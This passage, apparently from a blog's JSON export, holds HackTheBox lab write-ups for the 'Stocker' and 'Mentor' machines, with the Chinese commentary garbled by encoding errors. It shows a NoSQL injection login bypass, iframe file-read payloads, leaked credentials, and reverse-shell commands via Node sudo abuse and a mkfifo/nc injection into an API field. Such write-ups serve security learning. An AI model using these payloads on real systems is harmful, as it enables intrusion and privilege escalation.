3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA) | 256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA) |_ 256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Eleventy v2.0.0 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Stock - Coming Soon! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ï¼ŒåŸŸåï¼šstocker.htb æ·»åŠ åŸŸååˆ°æœ¬åœ°hostsæ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# echo \"10.10.11.196 stocker.htb\" &gt;&gt; /etc/hosts è®¿é—®stocker.htbï¼ˆæ³¨ï¼šè‹¥kaliç§‘å­¦ä¸Šç½‘æ–¹æ¡ˆé‡‡ç”¨çš„æ˜¯é€šè¿‡proxychainsä»£ç†åˆ°ç‰©ç†æœºï¼Œåˆ™æ­¤å¤„ç”¨proxychainsæ‰“å¼€çš„firefoxæ¥è®¿é—®stocker.htbä¼šæ‰“ä¸å¼€ã€‚å› ä¸ºæ­¤æ—¶HTTPè¯·æ±‚æµé‡ä¼šè¢«ä»£ç†åˆ°ç‰©ç†æœºï¼Œè€Œä¸èµ°HTBå®˜æ–¹ç»™çš„VPNé€šé“ã€‚è‡³äºä¸ºä»€ä¹ˆä»£ç†åˆ°ç‰©ç†æœºå°±æ‰“ä¸å¼€ï¼Œç›¸å…³å…·ä½“ç»†èŠ‚å¯ä»¥é€šè¿‡Wiresharkç»“åˆè®¡ç®—æœºç½‘ç»œçŸ¥è¯†åˆ†æï¼‰ ç”¨gobusterçˆ†ä¸€ä¸‹å­åŸŸå â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://stocker.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.5 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/03/14 21:37:39 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login] Progress: 4968 / 4990 (99.56%) =============================================================== 2023/03/14 21:38:08 Finished =============================================================== æœ‰ä¸ªdev.stocker.htbå­åŸŸï¼Œ302é‡å®šå‘åˆ°/loginç›®å½•ï¼ŒåŒæ ·æ·»åŠ åˆ°hostsæ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# echo \"10.10.11.196 dev.stocker.htb\" &gt;&gt; /etc/hosts è®¿é—®ï¼Œç¡®å®æ˜¯ä¸ªç™»å½•é¡µé¢ ç”¨Wappalyzeræ’ä»¶çœ‹åˆ°ç½‘ç«™æ˜¯Nodejså†™çš„ NoSQLæ³¨å…¥NoSQLï¼šhttps://www.mongodb.com/zh-cn/nosql-explained ä¸€èˆ¬è€Œè¨€ï¼ŒNoSQLæ•°æ®åº“æ˜¯å¯¹éå…³ç³»å‹æ•°æ®åº“çš„ç»Ÿç§°ï¼Œæ˜¯ä¸ªå¹¿ä¹‰æ¦‚å¿µã€‚å¸¸è§NoSQLæ•°æ®åº“ï¼Œå¦‚MongoDBï¼ˆæ–‡æ¡£æ•°æ®åº“ï¼‰ã€Redisï¼ˆé”®å€¼æ•°æ®åº“ï¼‰ã€Cassandraï¼ˆå®½åˆ—å­˜å‚¨æ•°æ®åº“ï¼‰ã€JanusGraphï¼ˆå›¾å½¢æ•°æ®åº“ï¼‰ç­‰ã€‚ éšä¾¿è¾“å…¥ä¸€ç»„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œå¹¶ç”¨BurpæŠ“åŒ…ï¼Œé‡æ”¾ è¿”å›ç™»å½•å¤±è´¥çš„æŠ¥é”™ ä¿®æ”¹Content-Typeå€¼ä¸ºapplication/jsonï¼Œä¿®æ”¹è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†å¦‚ä¸‹ {\"username\":{\"$ne\":\"admin\"}, \"password\":{\"$ne\":\"admin\"}} å¯çœ‹åˆ°302é‡å®šå‘åˆ°/stockç›®å½•ï¼Œæµè§ˆå™¨æ‰“å¼€æ­¤ç›®å½•ï¼Œå‘ç°æˆåŠŸç™»å½• SSRFé¡µé¢ä¸‹æ‹‰ï¼Œéšä¾¿é€‰ä¸€ä¸ªå•†å“ï¼Œæ­¤å¤„é€‰äº†ä¸€ä¸ªæ¯å­ï¼Œæ·»åŠ åˆ°è´­ç‰©è½¦ï¼Œç„¶åæŸ¥çœ‹è´­ç‰©è½¦ï¼Œç‚¹å‡»æäº¤è´­ä¹°ï¼ŒåŒæ—¶ç”¨BurpæŠ“å–è¯·æ±‚åŒ… å¯çœ‹åˆ°å½“å‰ç›®å½•æ˜¯åœ¨/api/orderï¼ŒBurpé‡æ”¾è¯·æ±‚åŒ…ä¹‹åï¼Œå¯çœ‹åˆ°è¿”å›ä¸€ä¸ªorderId å›åˆ°æµè§ˆå™¨ï¼Œå–æ¶ˆBurpä»£ç†æŠ“åŒ…ï¼Œæœ‰å¦‚ä¸‹å¼¹çª—ï¼Œç‚¹å‡»hereè·³è½¬ å‘ç°é¡µé¢è·³è½¬åˆ°/api/po/[OrderID]ï¼Œæ˜¯ä¸ªPDF åœ¨å°è¯•åï¼Œå‘ç°ä¿®æ”¹titleå­—æ®µå€¼ï¼Œé¡µé¢ä¸­çš„Itemæ¡ç›®ä¼šç›¸åº”å˜æˆtitleå­—æ®µå€¼ï¼ˆæ¯æ¬¡åœ¨Burpä¿®æ”¹titleå­—æ®µå€¼ï¼Œç„¶åé‡æ”¾è¯·æ±‚åŒ…åï¼ŒæŠŠè¿”å›çš„OrderIDå€¼å¤åˆ¶ç²˜è´´åˆ°URLæ æœ«å°¾å³å¯è®¿é—®ï¼‰ å‚è€ƒ https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file https://techkranti.com/ssrf-aws-metadata-leakage/ äºæ˜¯ä¿®æ”¹titleå­—æ®µå€¼å¦‚ä¸‹ï¼Œå°è¯•è¯»å–etc/passwdæ–‡ä»¶ &lt;iframe src=/etc/passwd&gt;&lt;/iframe&gt; Itemæ¡ç›®æ˜¾ç¤ºå‡º/etc/passwdå†…å®¹ï¼Œä½†ä¸æ˜¯å¾ˆå…¨ é‚£å°±å°è¯•æŠŠå®½é«˜è®¾å¤§ä¸€äº›ï¼Œå†æ¬¡è¯»å–ï¼Œå‘ç°èƒ½çœ‹åˆ°çš„éƒ¨åˆ†å°±å¤šäº† &lt;iframe src=/etc/passwd height=500 width=500&gt;&lt;/iframe&gt; è¯»å–nginxé»˜è®¤é…ç½® &lt;iframe src=file:///etc/nginx/nginx.conf height=1100px width=1100px&lt;/iframe&gt; å‘ç°ç½‘ç«™æ ¹ç›®å½•åœ¨/var/www/devï¼Œé‚£å°±å°è¯•è¯»å–index.jsé…ç½®æ–‡ä»¶ &lt;iframe src=file:///var/www/dev/index.js height=1000px width=1000px&gt;&lt;/iframe&gt; é€šè¿‡å‰é¢/etc/passwdï¼ŒçŸ¥é“æœ‰ä¸¤ä¸ªæ™®é€šç”¨æˆ·ï¼Œmongdbå’Œangooseï¼Œé…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªç–‘ä¼¼å¯†ç çš„å­—ç¬¦ä¸² å°è¯•ä¹‹åï¼Œå‘ç°SSHç”¨æˆ·å¯†ç å¦‚ä¸‹ Angoose IHeardPassphrasesArePrettySecure â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh angoose@10.10.11.196 The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established. ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng. Are you sure you want to continue connecting (yes/no/[fingerprint])? y Please type 'yes', 'no' or the fingerprint: yes Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts. angoose@10.10.11.196's password: Last login: Tue Mar 14 22:45:53 2023 from 10.10.14.187 angoose@stocker:~$ id uid=1001(angoose) gid=1001(angoose) groups=1001(angoose) angoose@stocker:~$ pwd /home/angoose æƒé™æå‡sudo -læŸ¥çœ‹angooseç”¨æˆ·æƒé™ angoose@stocker:~$ sudo -l [sudo] password for angoose: Matching Defaults entries for angoose on stocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User angoose may run the following commands on stocker: (ALL) /usr/bin/node /usr/local/scripts/*.js å‘ç°angooseç”¨æˆ·å¯æ‰§è¡Œ/usr/bin/node /usr/local/scripts/*.js é‚£æˆ‘ä»¬å°±å°è¯•åœ¨/usr/local/scriptsç›®å½•ä¸‹å†™ä¸€ä¸ªjsæ–‡ä»¶ï¼Œä½†å‘ç°åœ¨æ­¤ç›®å½•æ— å¯å†™æƒé™ï¼Œé‚£å°±ä¾ç„¶åœ¨angooseç”¨æˆ·çš„homeç›®å½•ä¸‹å†™wa0er_rev.jsï¼Œå†…å®¹æ˜¯åå¼¹shellï¼Œå¦‚ä¸‹ angoose@stocker:~$ vi wa0er_rev.js require('child_process').exec(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.x.x/9898 0&gt;&amp;1'\") å¼€å¯ncç›‘å¬ nc -nvlp 9898 æ‰§è¡Œï¼Œåˆšåˆšçš„åå¼¹shellæ–‡ä»¶ angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/wa0er_rev.js [sudo] password for angoose: æˆåŠŸè·å–rootæƒé™ Overï¼ æ€»ç»“ ä¿¡æ¯æ”¶é›†å‘ç°ç™»å½•ç‚¹ï¼Œå°è¯•å‘ç°ç™»å½•ç‚¹å­˜åœ¨NoSQLæ³¨å…¥ï¼› NoSQLæ³¨å…¥ç»•è¿‡ç™»å½•éªŒè¯ï¼› æäº¤è´­ç‰©ä¿¡æ¯å‘ç°æœ‰PDFå­˜åœ¨SSRFï¼› SSRFè¯»å–æ•æ„Ÿæ–‡ä»¶å‘ç°SSHç”¨æˆ·ï¼› sudo -lå‘ç°SSHç”¨æˆ·æœ‰æ‰§è¡Œæ–‡ä»¶æƒé™ï¼› æ‰§è¡Œæ–‡ä»¶åå¼¹shellï¼Œè·å–rootæƒé™ã€‚ å‚è€ƒHackTheBox Stockerï¼šhttps://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7 HackTheBox Stockerï¼šhttps://blog.csdn.net/qq_45894840/article/details/128765294","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Mentor","slug":"HTB4-Mentor","date":"2023-03-18T06:04:00.000Z","updated":"2023-08-31T07:55:40.849Z","comments":true,"path":"posts/b2f064df.html","link":"","permalink":"https://wa0er.github.io/posts/b2f064df.html","excerpt":"","text":"HTB-Mentorä¿¡æ¯æ”¶é›†nmap â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sC -sV -oA nmap/result 10.10.11.193 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST Nmap scan report for 10.10.11.193 Host is up (0.38s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA) |_ 256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://mentorquotes.htb/ Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ï¼ŒåŸŸåhttp://mentorquotes.htb/ æ·»åŠ åŸŸååˆ°æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.193 mentorquotes.htb\" &gt;&gt; /etc/hosts URLè®¿é—®http://mentorquotes.htb/ wfuzzä¸€ä¸‹å­åŸŸ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# wfuzz -H \"Host: FUZZ.mentorquotes.htb\" --hc 302,400 -t 50 -H \"User-Agent: wa0er\" -c -z file,\"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt\" http://mentorquotes.htb/ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://mentorquotes.htb/ Total requests: 38267 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000142: 404 0 L 2 W 22 Ch \"api\" Total time: 0 Processed Requests: 38267 Filtered Requests: 38266 Requests/sec.: 0 å¾—apiå­åŸŸï¼Œå°†apiå­åŸŸæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.193 api.mentorquotes.htb\" &gt;&gt; /etc/hosts è®¿é—®api.mentorquotes.htbï¼Œæ˜¯404 ffufçˆ†ç ´ä¸€ä¸‹api.mentorquotes.htbçš„ç›®å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://api.mentorquotes.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms] * FUZZ: admin [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms] * FUZZ: docs [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms] * FUZZ: users [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms] * FUZZ: quotes [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms] * FUZZ: server-status :: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 :: å¾—åˆ°api.mentorquotes.htbå››ä¸ªç›®å½•ï¼š/adminã€/docsã€/usersã€/quotesã€/server-status api.mentorquotes.htb/adminå¦‚ä¸‹ api.mentorquotes.htb/docså¦‚ä¸‹ï¼Œç”¨çš„Swagger UIï¼Œé¡µé¢èƒ½çœ‹åˆ°å¾ˆå¤šAPI å¯ä»¥çœ‹åˆ°è¿™ä¸ªç«™ç‚¹çš„ç«™ä¸»æ˜¯jamesï¼Œå¹¶ä¸”ä»–çš„é‚®ç®±æ˜¯james@mentorquotes.htb åœ¨/auth/signupå°è¯•æ³¨å†Œè´¦æˆ·ï¼Œå¦‚ä¸‹ç•Œé¢ï¼Œå¡«å†™emailã€usernameã€passwordï¼Œç‚¹å‡»Executeï¼ŒåŒæ—¶BurpæŠ“åŒ… BurpæŠ“åŒ…é‡æ”¾ï¼Œå¦‚ä¸‹ï¼Œå¯çœ‹åˆ°è´¦æˆ·å·²è¢«åˆ›å»º å°è¯•ç”¨åˆšåˆ›å»ºçš„è´¦æˆ·åœ¨/auth/loginç™»å½•ï¼Œå¡«å†™emailã€usernameã€passwordï¼Œç‚¹å‡»Executeï¼Œä¾ç„¶BurpæŠ“åŒ… Burpé‡æ”¾ï¼Œå‘ç°è¿”å›äº†ä¸€ä¸²JWTï¼ˆJsonWebTokenï¼Œä¸‹ç®€ç§°JWTï¼ŒJWTå…¸å‹çš„ä¸‰æ®µç»“æ„ï¼šxxx.xxx.xxxï¼‰ \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8\" /usersç›®å½•åº”è¯¥æ˜¯æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œäºæ˜¯åœ¨/usersç›®å½•å°è¯•ç™»å½•ï¼Œå¦‚æœç›´æ¥ç™»å½•ï¼Œä¼šå‘ç°æç¤ºéœ€è¦Authorizationå­—æ®µï¼Œé‚£æˆ‘ä»¬å°±æŠ“åŒ…åœ¨è¯·æ±‚å¤´æ·»åŠ å¦‚ä¸‹Authorizationé”®å€¼å¯¹ï¼Œé‡æ”¾HTTPè¯·æ±‚ï¼Œå‘ç°æç¤ºåªå…è®¸adminç”¨æˆ·è®¿é—® Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8 ç„¶åå°è¯•ç”¨jamesç”¨æˆ·çš„é‚®ç®±ç”¨æˆ·åå»æ³¨å†Œï¼Œå‘ç°ä¼šæç¤ºç”¨æˆ·å·²å­˜åœ¨ éšåè¿›è¡Œç™¾èˆ¬å°è¯•ï¼Œå‘ç°å®ƒéªŒè¯ç”¨æˆ·æ˜¯å¦å·²å­˜åœ¨çš„é€»è¾‘æ˜¯ï¼šå½“emailå’ŒusernameåŒæ—¶åŒ¹é…åˆ°ç›¸åŒçš„å€¼æ—¶ï¼Œæ‰ä¼šè®¤å®šæ­¤ç”¨æˆ·å·²å­˜åœ¨ã€‚äºæ˜¯å°è¯•ä¼ªé€ ç®¡ç†å‘˜ç”¨æˆ·è·å–ç®¡ç†å‘˜JWTï¼ˆè¿™é‡Œçš„ç®¡ç†å‘˜ç”¨æˆ·æ¨æµ‹åº”è¯¥æ˜¯ç«™ä¸»jamesæˆ–è€…adminï¼‰ã€‚ ä½†éšåç”¨æ³¨å†Œâ†’ç™»å½•ï¼ˆè·å–JWTï¼‰â†’/usersç›®å½•å°è¯•äº†ä»¥ä¸‹5ç§ç»„åˆï¼Œå‡æç¤ºåªæœ‰adminç”¨æˆ·èƒ½è®¿é—®è¯¥èµ„æº { \"email\":\"james@mentorquotes.htb\", \"username\":\"wa0er\", \"password\":\"wa0erwa0er\" } { \"email\":\"wa0er@mentorquotes.htb\", \"username\":\"james\", \"password\":\"wa0erwa0er\" } { \"email\":\"admin@mentorquotes.htb\", \"username\":\"admin\", \"password\":\"wa0erwa0er\" } { \"email\":\"admin@mentorquotes.htb\", \"username\":\"wa0er\", \"password\":\"wa0erwa0er\" } { \"email\":\"wa0er@mentorquotes.htb\", \"username\":\"admin\", \"password\":\"wa0erwa0er\" } éšåæ•´ç†æ€è·¯ï¼Œåœ¨ä¸€æ¬¡nmapæ‰«æä¸­ï¼Œçœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sU 10.10.11.193 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST Nmap scan report for mentorquotes.htb (10.10.11.193) Host is up (0.23s latency). Not shown: 998 closed ports PORT STATE SERVICE 68/udp open|filtered dhcpc 161/udp open|filtered snmp Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds 68ç«¯å£ï¼ˆDHCPCï¼‰å’Œ161ç«¯å£ï¼ˆSNMPï¼‰å¼€æ”¾ï¼ŒDHCPå¯èƒ½çš„æ”»å‡»ä¸»è¦å°±æ˜¯æ‹’ç»æœåŠ¡å’Œä¸­é—´äººæ”»å‡»ï¼Œç”¨ä¸ä¸Šï¼Œé‚£å°±ä»SNMPä¸‹æ‰‹ã€‚ SNMPå…¨ç§°ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼Œæ˜¯ä¸“é—¨è®¾è®¡ç”¨äºåœ¨IPç½‘ç»œç®¡ç†ç½‘ç»œèŠ‚ç‚¹ï¼ˆæœåŠ¡å™¨ã€å·¥ä½œç«™ã€è·¯ç”±å™¨ã€äº¤æ¢æœºåŠHUBSç­‰ï¼‰çš„ä¸€ç§æ ‡å‡†åè®®ï¼Œæ˜¯ä¸€ç§åº”ç”¨å±‚åè®®ã€‚é€šè¿‡SNMPå¯ä»¥è®¿é—®è®¾å¤‡ä¿¡æ¯ã€æ”¹å†™å’Œé…ç½®è®¾å¤‡å‚æ•°ç­‰ï¼ŒSNMPè¿è¡Œåœ¨UDP161ç«¯å£ä¸Šï¼Œé‡‡ç”¨UDPåè®®åœ¨ç®¡ç†ç«¯å’Œagentä¹‹é—´ä¼ è¾“ä¿¡æ¯ã€‚ è¯•è¯•ç”¨snmpbulkwalkè¯»å–ç›¸å…³é…ç½®ä¿¡æ¯ https://linux.die.net/man/1/snmpbulkwalk snmpbulkwalk -c internal -v2c 10.10.11.193 &gt; snmpbulk_mentor æ³¨ï¼š -v 1|2c|3 æŒ‡å®šSNMPç‰ˆæœ¬ -c COMMUNITY æŒ‡å®šcommunity string -m MIB[:...] æŒ‡å®šMIBæ–‡ä»¶ï¼ˆæ­¤å¤„æ²¡ç”¨åˆ°ï¼‰ æŸ¥çœ‹åˆšè¯»å–çš„é…ç½®ä¿¡æ¯ï¼Œæœç´¢å¸¦æœ‰loginå­—ç¬¦ä¸²çš„æ¡ç›®ï¼Œå‘ç°/usr/local/bin/login.pyæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²kj23sadkj123as0-d213ï¼Œå¯èƒ½æ˜¯ç®¡ç†å‘˜çš„ç™»å½•å¯†ç  cat snmpbulk mentor | grep login æˆ‘ä»¬åˆ°/auth/loginç›®å½•ï¼Œç”¨jamesçš„é‚®ç®±å’Œç”¨æˆ·åï¼Œå¯†ç å¡«å†™åˆšè·å¾—çš„å¯†ç ï¼ŒæˆåŠŸç™»å½•ï¼Œè·å–åˆ°jamesè´¦æˆ·JWT \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0\" Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 å‘½ä»¤æ‰§è¡Œè®¿é—®/users/ç›®å½•ï¼ŒæˆåŠŸæ‹¿åˆ°ç”¨æˆ·åˆ—è¡¨ï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªç”¨æˆ·ï¼šjameså’Œservice_acc åˆšæ‰æˆ‘ä»¬çˆ†ç ´å‡ºäº†/adminç›®å½•ï¼Œæˆ‘ä»¬é‡æ–°ç”¨è¿™ä¸ªJWTè®¿é—®æ­¤ç›®å½•ï¼Œå‘ç°æœ‰ä¸¤ä¸ªåŠŸèƒ½ç›®å½• \"admin_funcs\":{ \"check db connection\":\"/check\", \"backup the application\":\"/backup\" è®¿é—®/admin/checkï¼Œè¿”å›Not implemented yet! è®¿é—®/admin/backupï¼Œè¿”å›Method Not Allowed åœ¨è¯·æ±‚å¤´åŒºåŸŸå•å‡»é¼ æ ‡å³é”®ï¼Œé€‰æ‹©Change request methodï¼Œè‡ªåŠ¨åˆ‡æ¢æˆPOSTæ–¹æ³•ï¼Œç‚¹å‡»sendå‘é€æ•°æ®åŒ…åï¼Œ å¯çœ‹åˆ°å“åº”åŒ…content-typeå€¼ä¸ºapplication/jsonï¼Œå†åŠ ä¸Šæ•°æ®éƒ¨åˆ†çš„æŠ¥é”™ï¼Œæ„æ€å°±æ˜¯è¯·æ±‚åŒ…éœ€è¦æœ‰å¸¦bodyå±æ€§çš„jsonå¯¹è±¡ ä¿®æ”¹content-typeå€¼ä¸ºapplication/jsonï¼Œè¯·æ±‚å¤´å†…å®¹æ·»åŠ jsonå¯¹è±¡ï¼Œbodyä¸ºç©ºå°±è¡Œï¼Œåˆæç¤ºéœ€è¦pathå±æ€§ äºæ˜¯åœ¨è¯·æ±‚å¤´å†…å®¹æ·»åŠ bodyå±æ€§å’Œpathå±æ€§ï¼Œè¿”å›Done!ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ŒDoneäº†ä¸ªå¯‚å¯ï¼Œåº”è¯¥æ˜¯ä»£å…¥æ‰§è¡Œäº† é‚£æˆ‘ä»¬å°±å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œä¿®æ”¹bodyå¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯pingæœ¬åœ°ä¸»æœºï¼ˆåŠ¡å¿…è®°å¾—æœ«å°¾åŠ åˆ†å·ï¼ï¼‰ åœ¨å‘é€è¯·æ±‚åŒ…å‰åœ¨æœ¬åœ°å¼€å¯tcpdumpæ•è·æ•°æ®åŒ… tcpdump -i tun0 icmp #åªæ•è·tun0ç½‘å¡çš„icmpåè®®æ•°æ®åŒ… å‘é€è¯·æ±‚åŒ…åï¼Œå¯åœ¨æœ¬åœ°çœ‹åˆ°æœ‰æ•°æ®åŒ…è¢«æ•è·ï¼Œè¯´æ˜å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œ é‚£å°±æ„é€ å¦‚ä¸‹è¯·æ±‚åŒ…ï¼Œæœ¬åœ°å¼€å¯ncç›‘å¬ nc -nvlp 9898 POST /admin/backup HTTP/1.1 Host: api.mentorquotes.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api.mentorquotes.htb/docs Connection: close Content-Type: application/json Content-Length: 108 { \"body\": \"wa0er\", \"path\":\"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.X.X 9898 &gt;/tmp/f;\" } æˆåŠŸåå¼¹shellï¼Œè·å–åˆ°rootæƒé™ï¼Œä½†çœ‹åˆ°ncæç¤ºsh: can't access tty; job control turned offï¼Œè¿™è¯´æ˜æ ¹æœ¬å°±æ²¡æœ‰è¿›åˆ°æ§åˆ¶ç»ˆç«¯ï¼Œå¯èƒ½æ˜¯ä¸ªè™šæ‹Ÿç¯å¢ƒä¹‹ç±»çš„ï¼Œå°è¯•è¯»å–/root/root.txtæ–‡ä»¶å‘ç°ç¡®å®æ²¡æœ‰ï¼Œæ‰€ä»¥è¿˜è¦è¿›ä¸€æ­¥getshell /app/appç›®å½•ä¸‹æœ‰db.py db.pyå†…å®¹å¦‚ä¸‹ import os from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData) from sqlalchemy.sql import func from databases import Database # Database url if none is passed the default one is used DATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\") # SQLAlchemy for quotes engine = create_engine(DATABASE_URL) metadata = MetaData() quotes = Table( \"quotes\", metadata, Column(\"id\", Integer, primary_key=True), Column(\"title\", String(50)), Column(\"description\", String(50)), Column(\"created_date\", DateTime, default=func.now(), nullable=False) ) # SQLAlchemy for users engine = create_engine(DATABASE_URL) metadata = MetaData() users = Table( \"users\", metadata, Column(\"id\", Integer, primary_key=True), Column(\"email\", String(50)), Column(\"username\", String(50)), Column(\"password\", String(128) ,nullable=False) ) # Databases query builder database = Database(DATABASE_URL) ä¸ºäº†ä¸PostgreSQLæ•°æ®åº“äº¤äº’ï¼Œéœ€è¦ç”¨åˆ°chiselå·¥å…· chiselå·¥å…·ï¼šhttps://github.com/jpillora/chisel ä»æœ¬åœ°ä¼ ä¸€ä¸ªchisel æœ¬åœ°ï¼špython3 -m http.server 80 é¶æœºï¼šwget http://[æœ¬åœ°IP]/chisel 